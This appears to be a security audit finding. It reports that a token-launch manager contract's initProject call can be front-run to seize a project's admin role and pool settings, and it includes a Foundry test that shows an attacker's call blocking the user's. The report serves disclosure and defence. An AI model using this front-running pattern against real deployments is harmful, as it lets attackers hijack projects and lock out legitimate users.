# Vulnerability details

## Impact

An attacker can front-run a user's attempt to start a project, opening up various attack vectors. These include reserving the most commonly used fee pools on Uniswap, leaving the user without options and forcing them to use another `BASE_TOKEN`, which in some cases may be impossible. Additionally, the attacker could gain access to the admin role of the project (useful for establishing whitelists, for example) and modify parameters such as `initialPoolPriceX96` and `launchTime` to values that could hinder the future functionality of the pool.

## Proof of Concept

```solidity
function testFrontRunProjectAdminRole() external {
        address user = makeAddr("user");
        address attacker = makeAddr("attacker");

        IILOManager.InitProjectParams memory userParams = IILOManager
            .InitProjectParams({
                saleToken: mockProject().saleToken,
                raiseToken: mockProject().raiseToken,
                fee: 10000,
                initialPoolPriceX96: mockProject().initialPoolPriceX96 + 1,
                launchTime: mockProject().launchTime
            });

        IILOManager.InitProjectParams memory attackerParams = IILOManager
            .InitProjectParams({
                saleToken: mockProject().saleToken,
                raiseToken: mockProject().raiseToken,
                fee: 10000,
                initialPoolPriceX96: mockProject().initialPoolPriceX96 +
                    542165465123,
                launchTime: mockProject().launchTime + 99999999999999
            });
        vm.startPrank(attacker);
        iloManager.initProject(attackerParams);
        vm.stopPrank();

        vm.startPrank(user);
        vm.expectRevert();
        iloManager.initProject(userParams);
        vm.stopPrank();
    }
```
